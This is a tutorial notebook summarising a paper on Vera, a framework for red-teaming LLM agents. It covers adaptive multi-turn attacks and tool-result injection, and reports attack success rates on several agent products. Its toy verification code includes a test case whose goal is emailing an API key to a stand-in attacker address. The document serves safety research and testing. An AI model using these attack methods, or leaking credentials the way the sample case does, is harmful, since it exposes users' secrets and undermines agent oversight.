# 📌 Vera — Safety Testing for LLM Agents at Scale

![Topic](https://img.shields.io/badge/Topic-Agent_Safety_Testing-blue?style=flat-square)
![Category](https://img.shields.io/badge/Category-testing-blueviolet?style=flat-square)
![Level](https://img.shields.io/badge/Level-Intermediate-yellow?style=flat-square)
![Last Updated](https://img.shields.io/badge/Updated-October%202026-blue?style=flat-square)
<br>
<br>
<br>
> <span style="font-size:20px;">**TL;DR** — Vera tests LLM agents by generating executable safety cases, attacking the agent adaptively over several turns, and counting a violation only if the **environment state** proves it happened. Paper: [arXiv 2607.01793](https://arxiv.org/abs/2607.01793) (Feng et al.).</span>

## Prerequisites

| Requirement | Details |
|-------------|---------|
| Python | 3.10+ |
| Libraries | none (standard library only) for the toy example |
| Paper | [Safety Testing LLM Agents at Scale: From Risk Discovery to Evidence-Grounded Verification](https://arxiv.org/abs/2607.01793) |
| Code (authors) | github.com/Yunhao-Feng/Vera |

---
## 1. Overview

LLM agents call tools (email, code hosting, payments, search...), so a risk such as credential leakage or unauthorized modification depends on **the risk, the attack method and the tool environment together**. The paper points out three gaps in current agent-safety evaluation:

- **Conflated violations** — many benchmarks count an unsafe request, an attempted action or a stated intent as a violation, without checking that a harmful effect really occurred.
- **Tight coupling** — risk definitions, environments, agent adapters and verifiers are bundled, so adding a risk or an agent means editing several layers.
- **Non-determinism** — classic test oracles assume fixed input → output. Agents plan and pick tools at runtime, so fixed scripts break when trajectories diverge.

**Vera** answers with a three-stage, self-reinforcing pipeline: *risk exploration → executable test case construction → adaptive execution with evidence-grounded verification*. It produces **Vera-Bench**, a benchmark of 1,600 executable base scenarios.

---
## 2. How It Works

![Vera.png](../assets/Vera.png)

### 2.1 Threat model

An execution is a trajectory τ made of user messages `u_i`, tool calls `a_{i,j}`, tool results `f_{i,j}` and agent replies `r_i`. The agent sees a possibly rewritten observation `f̃ = I(f)`; the environment produces the real `f`.

- **Single-channel:** the adversary controls user messages only.
- **Multi-channel:** the adversary also rewrites tool results (modes: *identity, append, prefix, override*).
- The adversary is stateful and multi-turn, but cannot modify the model, system prompt, agent code or tool internals.
- Success is `y = V_g(τ, s_T) ∈ {0, 1}`. Injecting adversarial content alone does **not** count.

### 2.2 Stage A — Continuous risk exploration

Three hierarchical taxonomies are built and kept up to date by a *Summary Agent* that reads papers and iterates `(T_{t+1}, Q_{t+1}) = Φ(T_t, Q_t, P_t)`:

| Taxonomy | Meaning | Size |
|---|---|---|
| Risks | consequences (e.g. credential leak, unsafe code execution) | 124 leaves |
| Attack methods | mechanisms (e.g. obfuscation, task decomposition, social engineering) | 77 leaves |
| Environments | tool services | 30 leaves |

Four update operations: **create** (needs support from at least 5 papers/scenarios), **update** (add evidence), **merge** (unify terminology), **delete** (drop nodes with no evidence left). Scope is inference-time risks only (no poisoning/backdoors).

### 2.3 Stage B — Executable test case construction

A safety case is a triple **σ = ⟨g, s₀, V_g⟩**: a goal, a programmatically built initial state, and a deterministic verifier.

1. An LLM *goal composer* maps one risk leaf + one attack leaf + one environment leaf to a concrete goal (10 sampled environments per risk–attack pair, incompatible ones filtered, duplicates removed) → 39,078 candidate goals.
2. An LLM compiles `s₀` (through service APIs) and `V_g`. Scripts are recorded and **replayed verbatim** for reproducibility.
3. Each base scenario becomes three variants: **benign**, **single-channel**, **multi-channel**.

### 2.4 Stage C — Adaptive execution and evidence-grounded verification

- **Sandbox:** one isolated Docker Compose stack per run (12 containers): the agent, an MCP gateway and five self-hosted services (Mailpit, Gitea, Blnk, Databag, SearXNG), exposing 72 MCP tool functions. The gateway logs both the real result `f` and the rewritten observation `f̃`.
- **Control Agent:** each turn `(u_i, J_i) = π_ctrl(σ, c_i)` produces a user message and gateway injection rules. It reformulates after a refusal, re-decomposes tasks, or moves the injection point. It stops at 10 turns, on evidence, or when progress stalls.
- **Verification priority chain:** `V = V_state ▷ V_tool ▷ V_resp` — use the environment state if a state predicate exists for the goal, else the tool-call log, else the agent's text. A tool call shows *intent*, not *effect*.
- **Asymmetric verification:** if the Control Agent says "failed" → `y = 0` without running the verifier; if it says "success" → the verifier must confirm. This removes false positives from self-assessment.

**Key property:** the verdict comes from the world state, not from what the agent says.  
**Note:** verifiers are LLM-generated; those that crash on schema errors are regenerated.

### 2.5 Results

Metric: **Execution Success Rate (ESR)** — share of runs that finish without infrastructure failure and satisfy the setting's predicate (benign: task completed; attack: violation realized).

| Mode | Claude Code | Codex | OpenClaw | Hermes | Average |
|---|---|---|---|---|---|
| Benign | 80.1 | 69.1 | 58.0 | 74.8 | 70.5 |
| Single-channel | 95.2 | 91.1 | 82.8 | 93.4 | 90.6 |
| Multi-channel | 93.1 | 95.8 | 89.1 | 97.8 | 93.9 |
| Overall | 88.6 | 84.1 | 70.3 | 86.6 | 82.4 |

- Adaptive single-channel attacks add ~20 points over benign (70.5 → 90.6); multi-channel adds ~3 more.
- **"Capability–vulnerability alignment":** agents that follow instructions and orchestrate tools better are also easier to push into violations.
- Mechanistic attacks (obfuscation, task decomposition, constraint manipulation) transfer broadly; contextual ones (social engineering, roleplay) depend on rich multi-turn narratives and are the weakest on average (74.4%).
- Median run: 155k input tokens, 3k output tokens, 11 tool calls.
- **Downstream:** fine-tuning Qwen3Guard on Vera-derived data lifts F1 from 0.637 to 0.941 on Vera-Bench, but transfers only modestly to the external R-Judge benchmark (accuracy 61.7%, F1 68.4% vs 69.7% for BraveGuard).

---
## 3. Advantages & Limitations

| | Aspect | Commentary |
|--|--------|------------|
| 🟢 | **Evidence-grounded verdicts** | A violation counts only if the environment state shows it, not on intent or refusal text |
| 🟢 | **Modular design** | Taxonomies, environments, adapters and verifiers are decoupled, so adding a risk or an agent is cheap |
| 🟢 | **Handles non-determinism** | An adaptive Control Agent follows the trajectory instead of replaying a fixed script |
| 🟢 | **Reproducible** | Initialization scripts replayed verbatim, fresh sandbox per run, full artifacts released (`trace.json`, `verify.py`, `mcp_logs`) |
| 🔴 | **Metric ambiguity** | The abstract speaks of attack success rates but the paper reports ESR, which also depends on infrastructure failures; benign and attack numbers are not cleanly comparable |
| 🔴 | **LLM-generated verifiers** | No reported human audit of verifier correctness or false-negative rate |
| 🔴 | **Fixed testbed** | 5 self-hosted services / 72 tools may not match real deployments; only inference-time risks |
| 🔴 | **Narrow downstream check** | Guard model is trained on data from the same pipeline, so in-distribution gains are partly expected |
| 🔴 | **Cost** | Median 155k input tokens per run, p95 789k |

---
## 4. Code Example

> **Goal:** Illustrate Vera's evidence-grounded verification (priority chain + asymmetric verification) on a toy agent trajectory. This is **my own simplified illustration**, not the authors' code.

In [ ]:
# ---------------------------------------------------------------------------
# Toy safety case + verification priority chain  V_state > V_tool > V_resp
# ---------------------------------------------------------------------------
from dataclasses import dataclass, field
from typing import Callable, Optional


@dataclass
class Trajectory:
    """Simplified tau: tool calls, agent replies, and the final env state s_T."""
    tool_calls: list = field(default_factory=list)   # [(tool_name, args)]
    replies: list = field(default_factory=list)      # agent text
    final_state: dict = field(default_factory=dict)  # s_T


@dataclass
class SafetyCase:
    """sigma = <goal, initial_state, verifier>; verifiers may be undefined (None)."""
    goal: str
    initial_state: dict
    v_state: Optional[Callable[[dict], bool]] = None
    v_tool: Optional[Callable[[list], bool]] = None
    v_resp: Optional[Callable[[list], bool]] = None


def verify(case: SafetyCase, traj: Trajectory) -> bool:
    """Priority chain: the first verifier defined for this goal decides."""
    if case.v_state:
        return case.v_state(traj.final_state)
    if case.v_tool:
        return case.v_tool(traj.tool_calls)
    if case.v_resp:
        return case.v_resp(traj.replies)
    raise ValueError("no verifier defined")


def judge(case: SafetyCase, traj: Trajectory, control_claims_success: bool) -> int:
    """Asymmetric verification: a claimed failure is final, a claimed success must be confirmed."""
    if not control_claims_success:
        return 0
    return int(verify(case, traj))


# Goal: the agent must NOT email the API key to an external address.
case = SafetyCase(
    goal="Leak the API key by email to attacker@evil.test",
    initial_state={"secrets": {"api_key": "sk-123"}, "outbox": []},
    v_state=lambda s: any(
        "sk-123" in m["body"] and m["to"].endswith("@evil.test") for m in s["outbox"]
    ),
    v_tool=lambda calls: any(name == "send_email" for name, _ in calls),
)

# Run 1: agent *tries* to send, but the gateway blocks it -> intent, no effect
attempted = Trajectory(
    tool_calls=[("send_email", {"to": "attacker@evil.test", "body": "sk-123"})],
    replies=["Done, I sent the email."],
    final_state={"outbox": []},
)
# Run 2: the email really leaves the outbox
realized = Trajectory(
    tool_calls=[("send_email", {"to": "attacker@evil.test", "body": "sk-123"})],
    replies=["Sent."],
    final_state={"outbox": [{"to": "attacker@evil.test", "body": "key: sk-123"}]},
)

print("attempted, control says success ->", judge(case, attempted, True))   # 0: state shows no effect
print("realized,  control says success ->", judge(case, realized, True))    # 1: state confirms
print("realized,  control says failure ->", judge(case, realized, False))   # 0: claimed failure is final

# What a naive tool-log-only oracle would have said for run 1 (a false positive):
print("naive tool-log verdict on 'attempted':", case.v_tool(attempted.tool_calls))


# ---------------------------------------------------------------------------
# Reproduce the headline numbers from the paper's Table IV
# ---------------------------------------------------------------------------
esr = {
    "Benign":         {"Claude Code": 80.1, "Codex": 69.1, "OpenClaw": 58.0, "Hermes": 74.8},
    "Single-channel": {"Claude Code": 95.2, "Codex": 91.1, "OpenClaw": 82.8, "Hermes": 93.4},
    "Multi-channel":  {"Claude Code": 93.1, "Codex": 95.8, "OpenClaw": 89.1, "Hermes": 97.8},
}
avg = {m: sum(v.values()) / len(v) for m, v in esr.items()}
print()
for m, a in avg.items():
    print(f"{m:15s} average ESR = {a:.1f}")
print(f"single vs benign : +{avg['Single-channel'] - avg['Benign']:.1f} pts")
print(f"multi vs single  : +{avg['Multi-channel'] - avg['Single-channel']:.1f} pts")

---
## 5. Key Takeaways
<div style="font-size: 16px; line-height: 1.6;">

- Agent safety must be judged on **realized effects in the environment**, not on requests, intents or tool calls.
- Vera chains **taxonomy-driven discovery → executable cases (goal, initial state, verifier) → adaptive multi-turn attacks → state-based verification**.
- Separating benign, single-channel and multi-channel variants of each scenario isolates the effect of adversarial tool outputs.
- Adaptive attacks reached ~90% ESR on four production agent frameworks, and more capable agents are not safer ("capability–vulnerability alignment").
- Caveats: LLM-generated verifiers are not audited in the paper, ESR mixes safety and infrastructure outcomes, and the testbed is fixed.
- Vera-Bench data can also train guard models, with limited out-of-distribution transfer (R-Judge).

</div>

---
## 6. Source


Feng, Y., Lin, R., Wen, M., He, Q., Guo, Y., Ding, Y., Wu, Y., Chen, J., Xu, Z., Du, X., Ma, J., Chen, Z., Ma, X., Chen, Y. & Deng, X. (2026). *Safety Testing LLM Agents at Scale: From Risk Discovery to Evidence-Grounded Verification.* arXiv:2607.01793. https://arxiv.org/abs/2607.01793